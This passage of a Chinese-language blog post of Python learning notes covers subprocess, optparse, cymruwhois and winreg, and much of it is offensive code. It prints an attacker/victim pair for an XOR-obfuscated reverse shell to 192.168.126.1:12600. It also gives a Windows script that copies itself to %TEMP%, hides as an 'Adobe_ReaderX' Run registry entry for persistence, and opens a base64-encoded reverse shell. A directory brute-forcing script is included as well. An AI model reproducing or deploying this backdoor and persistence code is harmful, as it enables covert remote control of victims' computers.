+<td style="text-align:center">executable</td>
+<td style="text-align:center">一般不用，args字符串或列表第一项表示程序名</td>
+</tr>
+<tr>
+<td style="text-align:center">stdin<br>stdout<br>stderr</td>
+<td style="text-align:center">None没有任何重定向，继承父进程<br>PIPE创建管道<br>文件对象<br>文件描述符(整数)<br>stderr还可以设置为STDOUT</td>
+</tr>
+<tr>
+<td style="text-align:center">preexec_fn</td>
+<td style="text-align:center">钩子函数，再fork和exec之间执行。(Unix)</td>
+</tr>
+<tr>
+<td style="text-align:center">close_fds</td>
+<td style="text-align:center">Unix下执行新进程前是否关闭0/1/2之外的文件<br>Windows下不继承还是继承父进程的文件描述符</td>
+</tr>
+<tr>
+<td style="text-align:center">shell</td>
+<td style="text-align:center">True<br>Unix下相当于args前面添加了<code>&quot;/bin/sh&quot; &quot;-c&quot;</code><br>Windows下相当于添加<code>&quot;cmd.exe /c&quot;</code></td>
+</tr>
+<tr>
+<td style="text-align:center">cwd</td>
+<td style="text-align:center">设置工作目录</td>
+</tr>
+<tr>
+<td style="text-align:center">universal_newlines</td>
+<td style="text-align:center">各种换行符统一处理为<code>\n</code></td>
+</tr>
+<tr>
+<td style="text-align:center">startupinfo</td>
+<td style="text-align:center">Windows下传递给CreateProcess的结构体</td>
+</tr>
+<tr>
+<td style="text-align:center">creationflags</td>
+<td style="text-align:center">Windows下，传递CREATE_NEW_CONSOLE创建自己的控制台窗口</td>
+</tr>
+</tbody>
+</table>
+<p>args:<br>args参数。可以是一个字符串，可以是一个包含程序参数的列表。要执行的程序一般就是这个列表的第一项，或者是字符串本身。<br><code>subprocess.Popen([&quot;cat&quot;,&quot;test.txt&quot;])</code><br><code>subprocess.Popen(&quot;cat test.txt&quot;)</code><br>这两个之中，后者将不会工作。因为如果是一个字符串的话，必须是程序的路径才可以。(考虑unix的api函数exec，接受的是字符串<br>列表)<br>但是下面的可以工作<br><code>subprocess.Popen(&quot;cat test.txt&quot;, shell=True)</code><br>这是因为它相当于<br><code>subprocess.Popen([&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;cat test.txt&quot;])</code><br>在*nix下，当shell=False（默认）时，Popen使用os.execvp()来执行子程序。args一般要是一个【列表】。如果args是个字符串的<br>话，会被当做是可执行文件的路径，这样就不能传入任何参数了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#shell.py 攻击者</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.bind((&apos;192.168.126.1&apos;,12600))</span><br><span class="line">s.listen(2048)</span><br><span class="line">print (&apos;Listening on port 12600... &apos;)</span><br><span class="line">(client,(ip,port)) = s.accept()</span><br><span class="line">print (f&apos;received connection from : &#123;ip&#125;&apos;)</span><br><span class="line">while True:</span><br><span class="line">    command = input(&apos;~$ &apos;)</span><br><span class="line">    # bytearray()需要将str进行编码再byte</span><br><span class="line">    encode = bytearray(command.encode(&apos;utf-8&apos;))</span><br><span class="line">    for i in range(len(encode)):</span><br><span class="line">        # XOR encode data</span><br><span class="line">        encode[i] ^= 0x41</span><br><span class="line">    client.send(encode)</span><br><span class="line">    en_data = client.recv(2048)</span><br><span class="line">    decode = bytearray(en_data)</span><br><span class="line">    for i in range(len(decode)):</span><br><span class="line">        decode[i] ^= 0x41</span><br><span class="line">    print (decode.decode())</span><br><span class="line">client.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#backdoor.py 受害者</span><br><span class="line">import socket,subprocess,sys</span><br><span class="line">RHOST = sys.argv[1]</span><br><span class="line">RPORT = 12600</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((RHOST,RPORT))</span><br><span class="line">while True:</span><br><span class="line">    # receive XOR encoded data from network socket</span><br><span class="line">    data = s.recv(1024)</span><br><span class="line">    # XOR decoded</span><br><span class="line">    en_data = bytearray(data)</span><br><span class="line">    for i in range(len(en_data)):</span><br><span class="line">        en_data[i] ^= 0x41</span><br><span class="line">    # Execute the decoded data as a command</span><br><span class="line">    # The subprocess module is great because we can PIPE STDOUT/STDERR/STDIN to a variable</span><br><span class="line">    comm = subprocess.Popen(str(en_data),shell = True,stdout = subprocess.PIPE,stderr = subprocess.PIPE,stdin = subprocess.PIPE)</span><br><span class="line">    comm.wait()</span><br><span class="line">    STDOUT,STDERR = comm.communicate()</span><br><span class="line">    print (STDERR)</span><br><span class="line">    # Encode the output and send to RHOST</span><br><span class="line">    en_STDOUT = bytearray(STDOUT)</span><br><span class="line">    for i in range(len(en_STDOUT)):</span><br><span class="line">        en_STDOUT[i] ^= 0x41</span><br><span class="line">    s.send(en_STDOUT)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<p><code>shell.py</code>运行</p>
+<p><img src="/2019/05/17/Python-Notes/shell.png" alt></p>
+<p><code>backdoor.py</code>运行</p>
+<p><img src="/2019/05/17/Python-Notes/backdoor.png" alt></p>
+<h2 id="optparse模块"><a href="#optparse模块" class="headerlink" title="optparse模块"></a>optparse模块</h2><h3 id="optparse-OptionParser"><a href="#optparse-OptionParser" class="headerlink" title="optparse.OptionParser()"></a>optparse.OptionParser()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parser = optparse.OptionParser(sys.argv[0] + &apos; &apos; + &apos;-i &lt;file_with URLs&gt; -r -s [optional]&apos;)</span><br></pre></td></tr></table></figure>
+<p>未加参数时回显</p>
+<p><img src="/2019/05/17/Python-Notes/optparse.OptionParser.png" alt></p>
+<h3 id="optparse-add-option"><a href="#optparse-add-option" class="headerlink" title="optparse.add_option()"></a>optparse.add_option()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parser.add_option(&apos;-i&apos;,dest=&apos;domains&apos;,type=&apos;string&apos;,help=&apos;specify target file with URLs&apos;)</span><br><span class="line">parser.add_option(&apos;-r&apos;,dest=&apos;directorys&apos;,type=&apos;string&apos;,help=&apos;specify a file with directory to request&apos;)</span><br><span class="line">parser.add_option(&apos;-s&apos;,dest=&apos;search&apos;,type=&apos;string&apos;,help=&apos;[optional] Specify a search string -s&apos;)</span><br></pre></td></tr></table></figure>
+<p><code>--help</code>显示参数</p>
+<p><img src="/2019/05/17/Python-Notes/optparse.add_option.png" alt></p>
+<h3 id="optparse-parse-args"><a href="#optparse-parse-args" class="headerlink" title="optparse.parse_args()"></a>optparse.parse_args()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(options,args) = parser.parse_args()</span><br></pre></td></tr></table></figure>
+<p>返回两个值，<code>options</code>包含所有<code>options</code>的对象，参数作为对象的属性，<code>args</code>解析<code>options</code>后剩余参数的列表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">domains = options.domains</span><br></pre></td></tr></table></figure>
+<h3 id="optparse-attributes"><a href="#optparse-attributes" class="headerlink" title="optparse.attributes"></a>optparse.attributes</h3><h4 id="option-action"><a href="#option-action" class="headerlink" title="option.action"></a>option.action</h4><p>默认为<code>store</code></p>
+<h4 id="option-type"><a href="#option-type" class="headerlink" title="option.type"></a>option.type</h4><p>默认为<code>string</code></p>
+<h4 id="option-dest"><a href="#option-dest" class="headerlink" title="option.dest"></a>option.dest</h4><p>告诉optparse将参数写在哪里</p>
+<h4 id="option-help"><a href="#option-help" class="headerlink" title="option.help"></a>option.help</h4><p><code>help</code>选项显示内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#fake_dirbuster.py</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import sys,optparse,socket</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Colors:</span><br><span class="line">    RED = &apos;\033[91m&apos;</span><br><span class="line">    GREEN = &apos;\033[92m&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def webreq(domain,directorys):</span><br><span class="line">    directory = []</span><br><span class="line">    with open(directorys,&apos;r&apos;,encoding=&apos;utf-8&apos;) as file:</span><br><span class="line">        for item in file.readlines():</span><br><span class="line">            directory.append(item.strip()) # 移除目录中的换行符</span><br><span class="line">    for item in directory:</span><br><span class="line">        url = domain + &quot;/&quot; + item # 拼接URL</span><br><span class="line">        html_requested = requests.get(url) # 请求URL</span><br><span class="line">        if search:</span><br><span class="line">            parsed = BeautifulSoup(html_requested.content,&apos;lxml&apos;) # Parse the output with BeautifulSoup</span><br><span class="line">            if search in str(parsed):</span><br><span class="line">                print (Colors.GREEN + &quot;[+] URL: &quot; + url + &quot; [&quot; + str(html_requested.status_code) + &quot;] Found: &apos;&quot; + search + &quot;&apos; in output&quot;)</span><br><span class="line">        if html_requested.status_code == 404:</span><br><span class="line">            print (Colors.RED + &quot;[+] URL: &quot; + url + &quot; [&quot; + str(html_requested.status_code) + &quot;]&quot;)</span><br><span class="line">        elif html_requested.status_code:</span><br><span class="line">            print (Colors.GREEN + &quot;[+] URL: &quot; + url + &quot; [&quot; + str(html_requested.status_code) + &quot;]&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = optparse.OptionParser(sys.argv[0] + &apos; &apos; + &apos;-i &lt;file_with URLs&gt; -r -s [optional]&apos;) # 无参数回显</span><br><span class="line">    parser.add_option(&apos;-i&apos;,dest=&apos;domains&apos;,type=&apos;string&apos;,help=&apos;specify target file with URLs&apos;) # 设置参数</span><br><span class="line">    parser.add_option(&apos;-r&apos;,dest=&apos;directorys&apos;,type=&apos;string&apos;,help=&apos;specify a file with directory to request&apos;)</span><br><span class="line">    parser.add_option(&apos;-s&apos;,dest=&apos;search&apos;,type=&apos;string&apos;,help=&apos;[optional] Specify a search string -s&apos;)</span><br><span class="line">    (options,_) = parser.parse_args()</span><br><span class="line">    domains = options.domains</span><br><span class="line">    directorys = options.directorys</span><br><span class="line">    global search</span><br><span class="line">    search = options.search</span><br><span class="line"></span><br><span class="line">    if (domains == None) and (directorys == None):</span><br><span class="line">        print (parser.usage)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    if domains:</span><br><span class="line">        for domain in open(domains,&apos;r&apos;):</span><br><span class="line">            webreq(domain,directorys)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h2 id="cymruwhois模块"><a href="#cymruwhois模块" class="headerlink" title="cymruwhois模块"></a>cymruwhois模块</h2><h3 id="Client"><a href="#Client" class="headerlink" title="Client()"></a>Client()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from cymruwhois import Client</span><br><span class="line">c = client()</span><br><span class="line">google = c.lookup(&apos;8.8.8.8&apos;)</span><br><span class="line">type(google)</span><br><span class="line">&lt;class &apos;cymruwhois.record&apos;&gt;</span><br><span class="line">google.owner</span><br><span class="line">google.ip</span><br><span class="line">google.cc</span><br><span class="line">google.asn</span><br><span class="line">google.prefix</span><br></pre></td></tr></table></figure>
+<h3 id="Clien-lookupmany-dict"><a href="#Clien-lookupmany-dict" class="headerlink" title="Clien().lookupmany_dict()"></a>Clien().lookupmany_dict()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#返回字典，索引为ip</span><br><span class="line">result = Client.lookupmany_dict(iplist)</span><br><span class="line">result[&apos;8.8.8.8&apos;].owner</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#whois.py</span><br><span class="line">import sys,os,optparse</span><br><span class="line">from cymruwhois import Client</span><br><span class="line"></span><br><span class="line"># whois</span><br><span class="line">def look(iplist):</span><br><span class="line">    c = Client()</span><br><span class="line">    if ips:</span><br><span class="line">        result = c.lookupmany_dict(iplist) </span><br><span class="line">        head = &apos;%-20s  - %15s (%s) - %s&apos; % (&apos;net&apos;,&apos;ip&apos;,&apos;cc&apos;,&apos;owner&apos;)</span><br><span class="line">        print (head)</span><br><span class="line">        for ip in iplist:</span><br><span class="line">            # get network information</span><br><span class="line">            net = result[ip].prefix</span><br><span class="line">            owner = result[ip].owner</span><br><span class="line">            cc = result[ip].cc</span><br><span class="line">            info = &apos;%-20s  - %15s (%s) - %s&apos; % (net,ip,cc,owner)</span><br><span class="line">            print (info)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># check to ensure file is existed and readable</span><br><span class="line">def checkFile(ips):</span><br><span class="line">    if not os.path.isfile(ips):</span><br><span class="line">        print (&apos;[-] &apos; + ips + &apos; does not exist.&apos;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    if not os.access(ips,os.R_OK):</span><br><span class="line">        print (&apos;[-]&apos; + ips + &apos; access denied&apos;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    print (&apos;[+] Querying from: &apos; + ips)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = optparse.OptionParser(sys.argv[0] + &apos; -r &lt;file_with IPs&gt; || -i &lt;IP&gt;&apos;)</span><br><span class="line">    parser.add_option(&apos;-r&apos;,dest = &apos;ips&apos;,type = &apos;string&apos;,help = &apos;specify target IP address&apos;)</span><br><span class="line">    parser.add_option(&apos;-i&apos;,dest = &apos;ip&apos;,type = &apos;string&apos;,help = &apos;specify a target IP address&apos;)</span><br><span class="line">    (options,__) = parser.parse_args()</span><br><span class="line">    ip = options.ip</span><br><span class="line">    global ips </span><br><span class="line">    ips = options.ips</span><br><span class="line">    if (ips == None) and (ip == None):</span><br><span class="line">        print (parser.usage)</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    if ips:</span><br><span class="line">        checkFile(ips)</span><br><span class="line">        iplist = []</span><br><span class="line">        with open (ips,&apos;r&apos;,encoding=&apos;utf-8&apos;) as file:</span><br><span class="line">            for line in file.readlines():</span><br><span class="line">                iplist.append(line.strip())</span><br><span class="line">        look(iplist)</span><br><span class="line">    else:</span><br><span class="line">        result = Client().lookup(ip)</span><br><span class="line">        net = result.prefix</span><br><span class="line">        owner = result.owner</span><br><span class="line">        cc = result.cc</span><br><span class="line">        info = &apos;%-20s  - %15s (%s) - %s&apos; % (net,ip,cc,owner)</span><br><span class="line">        head = &apos;%-20s  - %15s (%s) - %s&apos; % (&apos;net&apos;,&apos;ip&apos;,&apos;cc&apos;,&apos;owner&apos;)</span><br><span class="line">        print (head)</span><br><span class="line">        print (info)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><h3 id="os-system-1"><a href="#os-system-1" class="headerlink" title="os.system()"></a>os.system()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&apos;ipconfig&apos;)</span><br></pre></td></tr></table></figure>
+<h3 id="subprocess-Popen-1"><a href="#subprocess-Popen-1" class="headerlink" title="subprocess.Popen()"></a>subprocess.Popen()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">com_str = &apos;ipconfig&apos;</span><br><span class="line">command = subprocess.Popen([com_str],stdout = subprocess.PIPE,shell = True)</span><br><span class="line">(output,__) = command.communicate()</span><br><span class="line"># 解码格式需要尝试 gbk gb2312 utf-8</span><br><span class="line">print (output.decode(&apos;gbk&apos;))</span><br><span class="line">with open(&apos;file.txt&apos;,&apos;a&apos;,encoding = &apos;utf-8&apos;) as file:</span><br><span class="line">	file.write(output)</span><br><span class="line">with open(&apos;file.txt&apos;,&apos;r&apos;,encoding = &apos;utf-8&apos;) as file:</span><br><span class="line">	print(file.read())</span><br></pre></td></tr></table></figure>
+<h2 id="winreg模块"><a href="#winreg模块" class="headerlink" title="winreg模块"></a>winreg模块</h2><p>_winreg模块在Python3中被重命名为winreg</p>
+<h3 id="winreg-OpenKey"><a href="#winreg-OpenKey" class="headerlink" title="winreg.OpenKey()"></a>winreg.OpenKey()</h3><p>打开特定key</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winreg.OpenKey(key,sub_key[,res=0[,sam=KEY_READ]])</span><br><span class="line">winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,&apos;SOFTWARE\Classes&apos;)</span><br></pre></td></tr></table></figure>
+<p>返回一个句柄对象<br><code>key</code>是一个已经打开的键，或任意一个预定义的<code>HKEY_*</code>常量<br><code>sub_key</code>是一个字符串，表示要打开的子键<br><code>res</code>为保留整数，必须为0，默认为0<br><code>sam</code>是一个整数，指定访问掩码，描述密钥的所需安全访问策略</p>
+<p>修改键值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winreg.SetValueEx(key, value_name, reserved, type, value)</span><br></pre></td></tr></table></figure>
+<p><code>key</code>是一个已经打开的键，或任意一个预定义的<code>HKEY_*</code>常量<br><code>value_name</code>是一个字符串，命名了哪一个值与之关联<br><code>reserved</code>可以使用任何值，<code>0</code>表示总是被传递给API<br><code>type</code>是一个整数，描述了数据类型。具体类型参考：<a href="https://docs.microsoft.com/zh-cn/windows/desktop/SysInfo/registry-value-types" target="_blank" rel="noopener">Registry Value Types</a><br><code>value</code>表示被赋予的新值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import sys,base64,os,socket,subprocess</span><br><span class="line">import winreg</span><br><span class="line"></span><br><span class="line">def autorun(tempdir,filename,run):</span><br><span class="line">    # copy file to %TEMP%</span><br><span class="line">    os.system(&apos;copy %s %s&apos; %(filename,tempdir))</span><br><span class="line">    # open reg</span><br><span class="line">    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,run)</span><br><span class="line">    runkey = []</span><br><span class="line">    i = 0</span><br><span class="line">    while True:</span><br><span class="line">        subkey = winreg.EnumKey(key,i)</span><br><span class="line">        runkey.append(subkey[0])</span><br><span class="line">        i += 1</span><br><span class="line">    if &apos;Adobe ReaderX&apos; not in runkey:</span><br><span class="line">        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,run,0,winreg.KEY_ALL_ACCESS)</span><br><span class="line">        winreg.SetValueEx(key,&apos;Adobe_ReaderX&apos;,0,winreg.REG_SZ,r&quot;%TEMP%mw.exe&quot;)</span><br><span class="line">        key.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shell():</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((&apos;192.168.126.1&apos;,int(12600)))</span><br><span class="line">    s.send(&apos;[*] Connection Established!&apos;)</span><br><span class="line">    while True:</span><br><span class="line">        data = s.recv(1024)</span><br><span class="line">        if data == &quot;quit&quot;:</span><br><span class="line">            break</span><br><span class="line">        proc = subprocess.Popen(data,shell = True,stdout = subprocess.PIPE,stderr = subprocess.PIPE,stdin = subprocess.PIPE)</span><br><span class="line">        stdout_value = proc.stdout.read + proc.stderr.read()</span><br><span class="line">        encoded = base64.b64encode(stdout_value)</span><br><span class="line">        s.send(encoded)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    tempdir = &apos;%TEMP%&apos;</span><br><span class="line">    fileName = sys.argv[0]</span><br><span class="line">    run = &apos;SoftwareMicrosoftWindowsCurrentVersionRun&apos;</span><br><span class="line">    autorun(tempdir,fileName,run)</span><br><span class="line">    shell()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="https://www.freebuf.com/news/topnews/58048.html" target="_blank" rel="noopener">Python黑客学习笔记：从HelloWorld到编写PoC（上）</a></p>
+<p>[2] <a href="https://www.freebuf.com/news/topnews/60758.html" target="_blank" rel="noopener">Python黑客学习笔记：从HelloWorld到编写PoC（中）</a></p>
+<p>[3] <a href="http://www.primalsecurity.net/tutorials/python-tutorials/" target="_blank" rel="noopener">Python Tutorials</a></p>
+<p>[4] <a href="https://www.cnblogs.com/zhoug2020/p/5079407.html" target="_blank" rel="noopener">python中的subprocess.Popen（）使用</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/16/VulnHub-Billu-b0x2/" rel="next" title="'VulnHub Billu b0x2 Walkthrough'">
+                <i class="fa fa-chevron-left"></i> 'VulnHub Billu b0x2 Walkthrough'
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2026/05/28/Will-i/" rel="prev" title="'Diary'">
+                'Diary' <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">chessur</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">31</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">tags</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/ChireC" title="GitHub &rarr; https://github.com/ChireC" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
